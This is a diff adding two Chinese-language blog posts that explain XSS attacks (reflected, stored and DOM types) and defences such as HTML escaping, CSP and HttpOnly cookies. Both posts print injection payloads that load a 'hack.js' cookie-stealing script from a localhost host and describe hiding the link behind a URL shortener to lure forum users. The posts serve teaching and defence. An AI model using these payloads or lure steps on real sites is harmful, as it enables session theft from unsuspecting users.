@@ -156,6 +156,439 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2022/02/08/XSS%E6%94%BB%E5%87%BB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Will Wan">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Will's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/02/08/XSS%E6%94%BB%E5%87%BB/" class="post-title-link" itemprop="url">XSS 攻击</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-02-08 09:34:35" itemprop="dateCreated datePublished" datetime="2022-02-08T09:34:35+08:00">2022-02-08</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-02-11 17:31:10" itemprop="dateModified" datetime="2022-02-11T17:31:10+08:00">2022-02-11</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="1-XSS-攻击"><a href="#1-XSS-攻击" class="headerlink" title="1. XSS 攻击"></a>1. XSS 攻击</h1><p>XSS，全称Cross-Site Scripting，跨站脚本攻击，是一种代码注入攻击。攻击者通过在目标网站上注入恶意脚本，使之在用户的浏览器上运行。利用这些恶意脚本，攻击者可以获得用户的敏感信息，如：cookie等，进而危害数据安全。</p>
+<p>XSS攻击的本质是：恶意代码未经过滤，与网站正常的代码混在一起；浏览器无法分辨哪些脚本是可信的，导致恶意脚本被执行。</p>
+<p>XSS攻击可能造成的危害：</p>
+<ul>
+<li>窃取Cookie或者本，发送恶意请求</li>
+<li>在网页插入恶意内容</li>
+<li>获取网站和用户个人信息</li>
+<li>其他利用用js脚本能造成的危害</li>
+</ul>
+<h2 id="XSS攻击分类"><a href="#XSS攻击分类" class="headerlink" title="XSS攻击分类"></a>XSS攻击分类</h2><p>根据攻击的来源，XSS 攻击可分为存储型、反射型和 DOM 型三种。</p>
+<table>
+<thead>
+<tr>
+<th>类型</th>
+<th>存储区</th>
+<th>插入点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>反射型XSS</td>
+<td>URL</td>
+<td>HTML</td>
+</tr>
+<tr>
+<td>存储型XSS</td>
+<td>后端数据库</td>
+<td>HTML</td>
+</tr>
+<tr>
+<td>DOM型XSS</td>
+<td>后端数据库/前端存储/URL</td>
+<td>前端JavaScript</td>
+</tr>
+</tbody></table>
+<h3 id="反射型XSS（url参数直接注入）"><a href="#反射型XSS（url参数直接注入）" class="headerlink" title="反射型XSS（url参数直接注入）"></a>反射型XSS（url参数直接注入）</h3><p>实现攻击步骤：</p>
+<ol>
+<li>alert尝试（看该网站是否有 XSS 漏洞）</li>
+<li>构造攻击url</li>
+<li>短域名伪造（通过短域名生成网站把上面构造的 XSS 攻击url转换成看似正常的url）</li>
+<li>把构造好的url放到贴吧、论坛或微博等网站，加上诱惑性的语言描述，吸引用户点击（这一步很关键，因为只有用户点击了该url链接，才可能造成攻击）</li>
+<li>用户打开带有恶意代码的 URL 时，网站服务端将恶意代码从 URL 中取出，拼接在 HTML 中返回给浏览器。</li>
+<li>用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。</li>
+</ol>
+<p>反射型 XSS 漏洞常见于通过 URL 传递参数的功能，如网站搜索、跳转等。由于需要用户主动打开恶意的 URL 才能生效，攻击者往往会结合多种手段诱导用户点击。</p>
+<p>例如：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 正常url</span></span><br><span class="line">http:<span class="comment">//localhost:3000/?from=china</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. alert尝试</span></span><br><span class="line">http:<span class="comment">//localhost:3000/?from=&lt;script&gt;alert(3)&lt;/script&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 构造攻击url：hack.js实现获取Cookie</span></span><br><span class="line">http:<span class="comment">//localhost:3000/?from=&lt;script src="http://localhost:4000/hack.js"&gt;&lt;/script&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 短域名伪造：通过百度短网址网站（https://dwz.cn/）缩短url </span></span><br><span class="line"><span class="comment">// 4. 把构造好的url放到贴吧</span></span><br><span class="line"><span class="comment">// 5. 用户打开带有恶意代码的 URL</span></span><br><span class="line"><span class="comment">// 后续步骤...</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="存储型-XSS-存储到数据库后读取时攻击"><a href="#存储型-XSS-存储到数据库后读取时攻击" class="headerlink" title="存储型 XSS - 存储到数据库后读取时攻击"></a>存储型 XSS - 存储到数据库后读取时攻击</h3><p>实现攻击步骤：</p>
+<ol>
+<li>alert尝试（看该网站是否有 XSS 漏洞）</li>
+<li>构造攻击脚本</li>
+<li>把攻击脚本注入网站数据库</li>
+<li>用户打开目标网站时，网站服务端将恶意代码从数据库取出，拼接在 HTML 中返回给浏览器。</li>
+<li>用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。</li>
+</ol>
+<p>这种攻击常见于带有用户保存数据的网站功能，如论坛发帖、商品评论、用户私信等。</p>
+<p><strong>反射型 XSS 跟存储型 XSS 的区别是：</strong>存储型 XSS 的恶意代码存在数据库里，反射型 XSS 的恶意代码存在 URL 里。</p>
+<p>例如：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 1. alert尝试</span></span><br><span class="line"><span class="comment">// 在有评论功能的网站发送如下评论，如果能弹出alert提示说明存在漏洞</span></span><br><span class="line">&lt;script&gt;alert(<span class="number">1</span>)&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/ 2. 构造攻击脚本：hack.js实现获取Cookie</span></span><br><span class="line"><span class="regexp">我来了&lt;script src="http:/</span><span class="regexp">/localhost:4000/</span>hack.js<span class="string">"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 3. 把攻击脚本注入网站数据库：通过发评论实现</span></span><br><span class="line"><span class="string">// 4. 用户访问该网页</span></span><br><span class="line"><span class="string">// 后续步骤...</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="DOM-型-XSS"><a href="#DOM-型-XSS" class="headerlink" title="DOM 型 XSS"></a>DOM 型 XSS</h3><p>实现攻击步骤：</p>
+<ul>
+<li>攻击者构造出特殊的 URL，其中包含恶意代码（恶意代码也可以存储在数据库或前端存储）。</li>
+<li>用户打开带有恶意代码的 URL。</li>
+<li>用户浏览器接收到响应后解析执行，<strong>前端 JavaScript 取出 URL 中的恶意代码并执行</strong>。</li>
+<li>恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</li>
+</ul>
+<p><strong>DOM 型 XSS 跟前两种 XSS 的区别</strong>：DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。</p>
+<h2 id="XSS攻击防范"><a href="#XSS攻击防范" class="headerlink" title="XSS攻击防范"></a>XSS攻击防范</h2><h3 id="预防存储型和反射型-XSS-攻击"><a href="#预防存储型和反射型-XSS-攻击" class="headerlink" title="预防存储型和反射型 XSS 攻击"></a>预防存储型和反射型 XSS 攻击</h3><p>存储型和反射型 XSS 都是在服务端取出恶意代码后，插入到响应 HTML 里的，攻击者刻意编写的“数据”被内嵌到“代码”中，被浏览器所执行。</p>
+<p>预防这两种漏洞，有两种常见做法：</p>
+<ul>
+<li>改成纯前端渲染，把代码和数据分隔开。</li>
+<li>对 HTML 做充分转义。</li>
+</ul>
+<h4 id="纯前端渲染"><a href="#纯前端渲染" class="headerlink" title="纯前端渲染"></a>纯前端渲染</h4><p>纯前端渲染的过程：</p>
+<p>浏览器先加载一个静态 HTML，此 HTML 中不包含任何跟业务相关的数据。<br>然后浏览器执行 HTML 中的 JavaScript。<br>JavaScript 通过 Ajax 加载业务数据，调用 DOM API 更新到页面上。<br><strong>在纯前端渲染中，我们会明确的告诉浏览器：下面要设置的内容是文本（.innerText），还是属性（.setAttribute），还是样式（.style）等等。浏览器不会被轻易的被欺骗，执行预期外的代码了。</strong></p>
+<p>但<strong>纯前端渲染还需注意避免 DOM 型 XSS 漏洞</strong>（例如 onload 事件和 href 中的 javascript:xxx 等，请参考下文”预防 DOM 型 XSS 攻击“部分）。</p>
+<p>在很多内部、管理系统中，采用纯前端渲染是非常合适的。但对于性能要求高，或有 SEO 需求的页面，我们仍然要面对拼接 HTML 或者的问题。</p>
+<h4 id="HTML-转义"><a href="#HTML-转义" class="headerlink" title="HTML 转义"></a>HTML 转义</h4><p>如果拼接 HTML 是必要的，就需要采用合适的转义库，对 HTML 模板各处插入点进行充分的转义。</p>
+<p>常用的模板引擎，如 doT.js、ejs、FreeMarker 等，对于 HTML 转义通常只有一个规则，就是把 &amp; &lt; &gt; “ ‘ / 这几个字符简单转义掉，确实能起到一定的 XSS 防护作用，但并不完善：</p>
+<table>
+<thead>
+<tr>
+<th>XSS 安全漏洞</th>
+<th>简单转义是否有防护作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>HTML 标签文字内容</td>
+<td>有</td>
+</tr>
+<tr>
+<td>HTML 属性值</td>
+<td>有</td>
+</tr>
+<tr>
+<td>CSS 内联样式</td>
+<td>无</td>
+</tr>
+<tr>
+<td>内联 JavaScript</td>
+<td>无</td>
+</tr>
+<tr>
+<td>内联 JSON</td>
+<td>无</td>
+</tr>
+<tr>
+<td>跳转链接</td>
+<td>无</td>
+</tr>
+</tbody></table>
+<p>所以要完善 XSS 防护措施，我们要使用更完善更细致的转义策略。例如 Java 工程里常用的转义库为 org.owasp.encoder，如果是node项目可以用 <a href="https://jsxss.com/zh/index.html" target="_blank" rel="noopener">xss</a>。</p>
+<h3 id="预防-DOM-型-XSS-攻击（前端重点）"><a href="#预防-DOM-型-XSS-攻击（前端重点）" class="headerlink" title="预防 DOM 型 XSS 攻击（前端重点）"></a>预防 DOM 型 XSS 攻击（前端重点）</h3><p>DOM 型 XSS 攻击，实际上就是网站前端 JavaScript 代码本身不够严谨，把不可信的数据当作代码执行了。</p>
+<p>在使用 .innerHTML、.outerHTML、document.write() 时要特别小心，不要把不可信的数据作为 HTML 插到页面上，而应尽量使用 .textContent、.setAttribute() 等。</p>
+<p>如果用 Vue/React 技术栈，在使用 v-html 时，也要注意避免 XSS 攻击，只在可信内容上使用 v-html。</p>
+<p>DOM 中的内联事件监听器，如 location、onclick、onerror、onload、onmouseover 等，<code>&lt;a&gt;</code> 标签的 href 属性，JavaScript 的 eval()、setTimeout()、setInterval() 等，都能把字符串作为代码运行。如果不可信的数据拼接到字符串中传递给这些 API，很容易产生安全隐患，请务必避免。</p>
+<h3 id="其他-XSS-防范措施"><a href="#其他-XSS-防范措施" class="headerlink" title="其他 XSS 防范措施"></a>其他 XSS 防范措施</h3><p>虽然在渲染页面和执行 JavaScript 时，通过谨慎的转义可以防止 XSS 的发生，但完全依靠开发的谨慎仍然是不够的。以下介绍一些通用的方案，可以降低 XSS 带来的风险和后果。</p>
+<ul>
+<li>HttpOnly Cookie</li>
+</ul>
+<h4 id="浏览器-XSS-过滤"><a href="#浏览器-XSS-过滤" class="headerlink" title="浏览器 XSS 过滤"></a>浏览器 XSS 过滤</h4><p>通过设置响应标头实现 XSS 过滤。配置语法如下：</p>
+<blockquote>
+<p>X-XSS-Protection: 0</p>
+</blockquote>
+<blockquote>
+<p>X-XSS-Protection: 1</p>
+</blockquote>
+<blockquote>
+<p>X-XSS-Protection: 1; mode=block</p>
+</blockquote>
+<blockquote>
+<p>X-XSS-Protection: 1; report=<reporting-uri></p>
+</blockquote>
+<ul>
+<li>0 关闭XSS过滤。</li>
+<li>1 启用XSS过滤（通常是浏览器默认的）。 如果检测到跨站脚本攻击，浏览器将清除页面（删除不安全的部分）。</li>
+<li>1;mode=block 启用XSS过滤。 如果检测到攻击，浏览器将不会清除页面，而是阻止页面加载。</li>
+<li>1; report= <reporting-uri> (Chromium only)。启用XSS过滤。 如果检测到跨站脚本攻击，浏览器将清除页面并使用CSP <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-uri" target="_blank" rel="noopener">report-uri</a> 指令的功能发送违规报告。</li>
+</ul>
+<p>例如在koa框架中设置：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ctx.set(<span class="string">'X-XSS-Protection'</span>, <span class="number">1</span>) <span class="comment">//0 关闭XSS过滤，1 启用 XSS 过滤（浏览器默认值）</span></span><br><span class="line"><span class="comment">// http://localhost:3000/?from=&lt;script&gt;alert(3)&lt;/script&gt; 可以拦截</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="内容安全策略"><a href="#内容安全策略" class="headerlink" title="内容安全策略"></a>内容安全策略</h3><p>内容安全策略 (CSP, Content Security Policy) 是一个附加的安全层，用于帮助检测和缓解某些类型的攻击，包括跨站脚本 (XSS) 和数据注入等攻击。</p>
+<p>CSP 本质上就是建立白名单，开发者明确告诉浏览器哪些外部资源可以加载和执行。我们只需要配置规则，如何拦截是由浏览器自己实现的。我们可以通过这种方式来尽量减少 XSS 攻击。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 只允许加载本站资源</span></span><br><span class="line">Content-Security-Policy: <span class="keyword">default</span>-src <span class="string">'self'</span></span><br><span class="line"><span class="comment">// 只允许加载 HTTPS 协议图片</span></span><br><span class="line">Content-Security-Policy: img-src https:<span class="comment">//*</span></span><br><span class="line"><span class="comment">// 不允许加载任何来源框架</span></span><br><span class="line">Content-Security-Policy: child-src <span class="string">'none'</span></span><br></pre></td></tr></table></figure>
+
+<p>更多配置详见：<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy。" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy。</a></p>
+<h3 id="HttpOnly-Cookie"><a href="#HttpOnly-Cookie" class="headerlink" title="HttpOnly Cookie"></a>HttpOnly Cookie</h3><p>这是预防XSS攻击窃取用户cookie最有效的防御手段。Web应 用程序在设置cookie时，将其属性设为 HttpOnly，就可以避免该网页的cookie被客户端恶意JavaScript窃取，保护用户cookie信息。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response.addHeader(<span class="string">"Set-Cookie"</span>, <span class="string">"uid=112; Path=/; HttpOnly"</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ul>
+<li>输入长度控制（增加 XSS 攻击的难度）</li>
+<li>验证码（防止脚本冒充用户提交危险操作）</li>
+</ul>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>XSS 攻击是一种代码注入攻击，主要分为3类：反射型、存储型和DOM型。反射型和存储型主要在后端通过HTML转义（通常使用html转移库）防御，或者采用纯前端渲染。</p>
+<p>在纯前端渲染中，我们要明确的告诉浏览器：下面要设置的内容是文本（.innerText），还是属性（.setAttribute），还是样式（.style）等等。这样浏览器不会被轻易的被欺骗，执行预期外的代码。纯前端渲染还需注意避免 DOM 型 XSS 漏洞，在使用 .innerHTML、.outerHTML、document.write() 时要特别小心，不要把不可信的数据作为 HTML 插到页面上。如果用 Vue/React 技术栈，在使用 v-html 时，也要注意避免 XSS 攻击，只在可信内容上使用 v-html。对于不可信的内容像后端一样通过HTML转义库来处理。</p>
+<p>此外，还有其他的xss防御措施包括：浏览器 XSS 过滤、内容安全策略、HttpOnly Cookie、输入长度控制和验证码等。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a href="https://tech.meituan.com/2018/09/27/fe-security.html" target="_blank" rel="noopener">前端安全系列（一）：如何防止XSS攻击？</a></li>
+<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy" target="_blank" rel="noopener">Content-Security-Policy</a></li>
+<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/X-XSS-Protection" target="_blank" rel="noopener">X-XSS-Protection</a></li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2022/02/08/%E5%B8%B8%E8%A7%81web%E6%94%BB%E5%87%BB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Will Wan">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Will's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/02/08/%E5%B8%B8%E8%A7%81web%E6%94%BB%E5%87%BB/" class="post-title-link" itemprop="url">常见web攻击</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-02-08 09:34:35" itemprop="dateCreated datePublished" datetime="2022-02-08T09:34:35+08:00">2022-02-08</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-02-11 17:32:50" itemprop="dateModified" datetime="2022-02-11T17:32:50+08:00">2022-02-11</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="1-XSS"><a href="#1-XSS" class="headerlink" title="1. XSS"></a>1. XSS</h2><p>XSS，全称Cross-Site Scripting，跨站脚本攻击，是一种代码注入攻击。攻击者通过在目标网站上注入恶意脚本，使之在用户的浏览器上运行。利用这些恶意脚本，攻击者可以获得用户的敏感信息，如：cookie等，进而危害数据安全。</p>
+<p>XSS攻击的本质是：恶意代码未经过滤，与网站正常的代码混在一起；浏览器无法分辨哪些脚本是可信的，导致恶意脚本被执行。</p>
+<p>XSS攻击可能造成的危害：</p>
+<ul>
+<li>获取网站的数据</li>
+<li>获取Cookie</li>
+<li>劫持前端逻辑</li>
+<li>发送虚假请求</li>
+<li>偷取用户的资料</li>
+<li>偷取用户的秘密和登录态</li>
+</ul>
+<h3 id="XSS攻击分类"><a href="#XSS攻击分类" class="headerlink" title="XSS攻击分类"></a>XSS攻击分类</h3><p>根据攻击的来源，XSS 攻击可分为存储型、反射型和 DOM 型三种。</p>
+<table>
+<thead>
+<tr>
+<th>类型</th>
+<th>存储区</th>
+<th>插入点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>反射型XSS</td>
+<td>URL</td>
+<td>HTML</td>
+</tr>
+<tr>
+<td>存储型XSS</td>
+<td>后端数据库</td>
+<td>HTML</td>
+</tr>
+<tr>
+<td>DOM型XSS</td>
+<td>后端数据库/前端存储/URL</td>
+<td>前端JavaScript</td>
+</tr>
+</tbody></table>
+<ul>
+<li>反射型XSS（url参数直接注入）</li>
+</ul>
+<p>实现攻击步骤：</p>
+<ol>
+<li>alert尝试（看该网站是否有xss漏洞）</li>
+<li>构造攻击url</li>
+<li>短域名伪造（通过短域名生成网站把上面构造的xss攻击url转换成看似正常的url）</li>
+<li>把构造好的url放到贴吧、论坛或微博等网站，加上诱惑性的语言描述，吸引用户点击（这一步很关键，因为只有用户点击了该url链接，才可能造成攻击）</li>
+<li>用户打开带有恶意代码的 URL 时，网站服务端将恶意代码从 URL 中取出，拼接在 HTML 中返回给浏览器。</li>
+<li>用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。</li>
+</ol>
+<p>反射型 XSS 漏洞常见于通过 URL 传递参数的功能，如网站搜索、跳转等。</p>
+<p>由于需要用户主动打开恶意的 URL 才能生效，攻击者往往会结合多种手段诱导用户点击。</p>
+<p>例如：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 正常url</span></span><br><span class="line">http:<span class="comment">//localhost:3000/?from=china</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. alert尝试</span></span><br><span class="line">http:<span class="comment">//localhost:3000/?from=&lt;script&gt;alert(3)&lt;/script&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 构造攻击url：hack.js实现获取Cookie</span></span><br><span class="line">http:<span class="comment">//localhost:3000/?from=&lt;script src="http://localhost:4000/hack.js"&gt;&lt;/script&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 短域名伪造：通过百度短网址网站（https://dwz.cn/）缩短url </span></span><br><span class="line"><span class="comment">// 4. 把构造好的url放到贴吧</span></span><br><span class="line"><span class="comment">// 5. 用户打开带有恶意代码的 URL</span></span><br><span class="line"><span class="comment">// 后续步骤...</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>存储型xss - 存储到数据库后读取时攻击</li>
+</ul>
+<p>实现攻击步骤：</p>
+<ol>
+<li>alert尝试（看该网站是否有xss漏洞）</li>
+<li>构造攻击脚本</li>
+<li>把攻击脚本注入网站数据库</li>
+<li>用户打开目标网站时，网站服务端将恶意代码从数据库取出，拼接在 HTML 中返回给浏览器。</li>
+<li>用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。</li>
+</ol>
+<p>这种攻击常见于带有用户保存数据的网站功能，如论坛发帖、商品评论、用户私信等。</p>
+<p><strong>反射型 XSS 跟存储型 XSS 的区别是：</strong>存储型 XSS 的恶意代码存在数据库里，反射型 XSS 的恶意代码存在 URL 里。</p>
+<p>例如：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 1. alert尝试</span></span><br><span class="line"><span class="comment">// 在有评论功能的网站发送如下评论，如果能弹出alert提示说明存在漏洞</span></span><br><span class="line">&lt;script&gt;alert(<span class="number">1</span>)&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/ 2. 构造攻击脚本：hack.js实现获取Cookie</span></span><br><span class="line"><span class="regexp">我来了&lt;script src="http:/</span><span class="regexp">/localhost:4000/</span>hack.js<span class="string">"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 3. 把攻击脚本注入网站数据库：通过发评论实现</span></span><br><span class="line"><span class="string">// 4. 用户访问该网页</span></span><br><span class="line"><span class="string">// 后续步骤...</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>DOM 型 XSS</li>
+</ul>
+<p>实现攻击步骤：</p>
+<ul>
+<li>攻击者构造出特殊的 URL，其中包含恶意代码。</li>
+<li>用户打开带有恶意代码的 URL。</li>
+<li>用户浏览器接收到响应后解析执行，前端 JavaScript 取出 URL 中的恶意代码并执行。</li>
+<li>恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</li>
+</ul>
+<p><strong>DOM 型 XSS 跟前两种 XSS 的区别</strong>：DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。</p>
+<h3 id="XSS攻击防范"><a href="#XSS攻击防范" class="headerlink" title="XSS攻击防范"></a>XSS攻击防范</h3><h4 id="预防存储型和反射型-XSS-攻击"><a href="#预防存储型和反射型-XSS-攻击" class="headerlink" title="预防存储型和反射型 XSS 攻击"></a>预防存储型和反射型 XSS 攻击</h4><p>存储型和反射型 XSS 都是在服务端取出恶意代码后，插入到响应 HTML 里的，攻击者刻意编写的“数据”被内嵌到“代码”中，被浏览器所执行。</p>
+<p>预防这两种漏洞，有两种常见做法：</p>
+<ul>
+<li>改成纯前端渲染，把代码和数据分隔开。</li>
+<li>对 HTML 做充分转义。</li>
+</ul>
+<h5 id="纯前端渲染"><a href="#纯前端渲染" class="headerlink" title="纯前端渲染"></a>纯前端渲染</h5><p>纯前端渲染的过程：</p>
+<p>浏览器先加载一个静态 HTML，此 HTML 中不包含任何跟业务相关的数据。<br>然后浏览器执行 HTML 中的 JavaScript。<br>JavaScript 通过 Ajax 加载业务数据，调用 DOM API 更新到页面上。<br>在纯前端渲染中，我们会明确的告诉浏览器：下面要设置的内容是文本（.innerText），还是属性（.setAttribute），还是样式（.style）等等。浏览器不会被轻易的被欺骗，执行预期外的代码了。</p>
+<p>但纯前端渲染还需注意避免 DOM 型 XSS 漏洞（例如 onload 事件和 href 中的 javascript:xxx 等，请参考下文”预防 DOM 型 XSS 攻击“部分）。</p>
+<p>在很多内部、管理系统中，采用纯前端渲染是非常合适的。但对于性能要求高，或有 SEO 需求的页面，我们仍然要面对拼接 HTML 的问题。</p>
+<h5 id="HTML-转义"><a href="#HTML-转义" class="headerlink" title="HTML 转义"></a>HTML 转义</h5><p>如果拼接 HTML 是必要的，就需要采用合适的转义库，对 HTML 模板各处插入点进行充分的转义。</p>
+<table>
+<thead>
+<tr>
+<th>XSS 安全漏洞</th>
+<th>简单转义是否有防护作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>HTML 标签文字内容</td>
+<td>有</td>
+</tr>
+<tr>
+<td>HTML 属性值</td>
+<td>有</td>
+</tr>
+<tr>
+<td>CSS 内联样式</td>
+<td>无</td>
+</tr>
+<tr>
+<td>内联 JSON</td>
+<td>无</td>
+</tr>
+<tr>
+<td>跳转链接</td>
+<td>无</td>
+</tr>
+</tbody></table>
+<ul>
+<li>通过设置响应标头实现xss过滤（可以拦截xss脚本，但伪装一下就拦截不了了）</li>
+</ul>
+<p>例如koa框架：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ctx.set(<span class="string">'X-XSS-Protection'</span>, <span class="number">0</span>) <span class="comment">//0 关闭XSS过滤，1 启用xss过滤（浏览器默认值）</span></span><br><span class="line"><span class="comment">// http://localhost:3000/?from=&lt;script&gt;alert(3)&lt;/script&gt; 可以拦截 但伪装一下就不行了</span></span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/12/17/ES5%E5%AE%9E%E7%8E%B0%E7%BB%A7%E6%89%BF/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -179,10 +612,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
